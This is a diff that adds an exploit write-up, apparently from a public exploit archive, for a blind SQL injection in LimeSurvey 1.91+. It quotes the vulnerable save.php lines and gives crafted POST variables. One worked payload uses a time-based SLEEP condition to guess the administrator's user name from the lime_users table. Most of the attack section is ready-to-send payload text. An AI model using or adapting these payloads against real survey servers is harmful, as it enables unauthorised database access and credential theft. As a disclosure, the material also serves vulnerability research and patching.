@@ -1,0 +1,101 @@
+# Exploit Title: LimeSurvey Blind SQL injection
+# Date: 20/02/2012
+# Author: TorTukiTu - OpenSphere
+# Version: 1.91+ build 11804
+# Tested on: php
+
+{cke_protected}{C}{cke_protected}{C}
+
+-------------------------------------------------------------------------
+
+
+# TorTukiTu - Killing Tortoise
+
+ 
+#        ,-"""-. 
+#   oo._/ \___/ \ 
+#  (____)_/___\__\_) 
+#      /_//   \\_\ 
+# 
+
+
+
+ 
+
+# Cookie hacking + Blind SQL Injection
+
+ 
+
+# The vulnerability occurs when a user answers a survey (index.php).
+
+# The session variables can be freely hacked using the following lines in save.php l.82 :
+
+#             if (isset($_POST[$pf])) {$_SESSION[$pf] = $_POST[$pf];}
+
+#            if (!isset($_POST[$pf])) {$_SESSION[$pf] = "";}
+
+# $pf is user input in the POST variable
+
+# once splitted, SQL request is directly build from those sessions variable by function createinsertquery(),
+
+# if a special Post variable 'srid' is set both in the variable
+
+# 'fieldnames' and as simple POST variable (query l. 715 save.php).
+
+# The user can realize blind SQL injections with specially crafted POST variables.
+
+ 
+
+# Normal POST variables example:
+
+ 
+
+fieldnames=17165X6X18SQ001%7C17165X6X18SQ002%7C17165X6X18SQ003%7C17165X6X18SQ004%7C17165X6X18SQ005%7C17165X6X18SQ006%7C17165X6X18SQ007%7C17165X6X18other%7C17165X6X26SQ001%7C17165X6X26SQ002%7C17165X6X26SQ003
+
+MULTI17165X6X18=8
+
+tbdisp17...
+
+...
+
+start_time=1329742665
+
+ 
+
+# Craft POST variables like this :
+
+ 
+
+fieldnames=17165X6X18SQ001%7C17165X6X18SQ002%7C17165X6X18SQ003%7C17165X6X18SQ004%7C17165X6X18SQ005%7C17165X6X18SQ006%7C17165X6X18SQ007%7C17165X6X18other%7C17165X6X26SQ001%7C17165X6X26SQ002%7C17165X6X26SQ003%7C[VALID FIELD ID]` = [SQL INJECTION]--%7Csrid
+
+MULTI17165X6X18=8
+
+tbdisp17...
+
+...
+
+start_time=1329742665
+
+srid=[SOME INTEGER]
+
+ 
+
+#Example : Blind SQL user name guessing :
+
+fieldnames=17165X6X18SQ001%7C17165X6X18SQ002%7C17165X6X18SQ003%7C17165X6X18SQ004%7C17165X6X18SQ005%7C17165X6X18SQ006%7C17165X6X18SQ007%7C17165X6X18other%7C17165X6X26SQ001%7C17165X6X26SQ002%7C17165X6X26SQ003%7C17165X6X18SQ001` = NULL WHERE id=6 AND id IN ( SELECT IF ( (SELECT SUBSTRING(users_name,1) FROM lime_users WHERE uid=1) LIKE 'a%', 1, SLEEP(5)))--%7Csrid
+
+MULTI17165X6X18=8
+
+tbdisp17...
+
+...
+
+start_time=1329742665
+
+srid=42
+
+ 
+
+ 
+
+-------------------------------------------------------------------------
